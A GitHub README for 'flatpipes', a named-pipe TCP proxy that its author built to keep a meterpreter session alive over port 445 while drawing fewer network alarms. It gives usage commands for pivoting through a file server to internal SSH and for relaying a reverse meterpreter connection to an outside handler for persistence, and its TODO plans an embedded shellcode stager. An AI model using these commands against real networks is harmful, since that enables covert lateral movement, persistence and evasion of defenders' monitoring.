# flatpipes
A TCP proxy over named pipes. Originally created for maintaining a meterpreter session over 445 for less network alarms.

![help](https://github.com/dxflatline/misc/raw/master/flatpipes-help.PNG "help")

Since it seems it can help in various situations, let's list a few:

#### Usage - TCP 10001 Chat over Named Pipe

On the 1st Windows host (pipe server) we create two pipes "pipename_s2c" & "pipename_c2s" and as soon as pipe negotiation is ok, we open a TCP listener at 10001: 
> *flatpipes.exe pserver sserver pipename . 127.0.0.1 10001*

On the 2nd Windows host (pipe client) we just connect to the pipe(s) created previously on the system X.X.X.X. As soon as we successfully connect, flatpipes open a listener on 10001 on this client machine too: 
> *flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001* 

Finally, netcat on the two hosts on their listeners and chat with yourself.

#### Usage - Bring a remote port here

Let's suppose you have access on the MS Fileserver through a Windows "jumphost" workstation. You want to ensure all communications are over 445 since it is normal for workstation to DC. We need to access SSH on another system in the server LAN but we can only connect to MS Fileserver 445 (and eg WMI for command exec)

On the MS Fileserver we create our pipes for "IPC", and as soon as pipe negotiation is ok, it will TCP connect to the SSH server in the LAN. All IO is through the flatpipes: 
> *flatpipes.exe pserver sclient pipename . 10.0.2.2 22*

On the jumphost we PIPE connect to the MS fileserver 10.0.2.10, and immediately spawn a TCP listener on localhost 22: 
> *flatpipes.exe pclient sserver pipename 10.0.2.10 127.0.0.1 22*

Just ssh on 127.0.0.1 22 and you are through the town portal


#### Usage - Reverse TCP meterpreter through pipes
On the MS Fileserver again and you want to maintain persistence, but over 445. You want reverse TCP meterpreter but also you want the jumphost to initiate the 445 connection.

On the MS Fileserver, same as above, we create two pipes and listen on 127.0.0.1 54321 for the reverse TCP meterpreter: 
> *flatpipes.exe pserver sserver pipename . 127.0.0.1 54321*

On the jumphost we connect to the MS Fileserver and immediately connect to the handler: 
> *flatpipes.exe pclient sclient pipename 10.0.2.10 IP_OF_METERPRETER_HANDLER 54321*

What this means is that we can exchange directions, eg use a reverse exploitation, but make the opposite network traffic. It is like an encapsulation over DNS, just needs some familiarization.

---

#### TODO
* Include a meterpreter bind/reverse stager (exec will C# virtualalloc / createthread)
* "Monkey patch" the above stager to change port on the fly (on hex)
* Exception handling. Asap when pipe auth does not work
* Think any other useful scenarios

---

I hope it will help. It is not very well-written, comments are welcome / looking for feedback.

<sub>PS: I don't know exactly (or have time to read) the details of CreateNamedPipe access controls. So I assume from MSDN that by using NULL security descriptor we allow RW access to Admins/System/Creator and R to everyone/anon. On the workstation that acts as a pipe client I test using eg *runas /user:server\tester /netonly "flatpipes.exe pclient sserver pipename X.X.X.X 127.0.0.1 10001"*. What happens with */netonly* is that you force an ntlm2 challenge response for all the pipe access requirements of the calls issued by flatpipes.</sub>
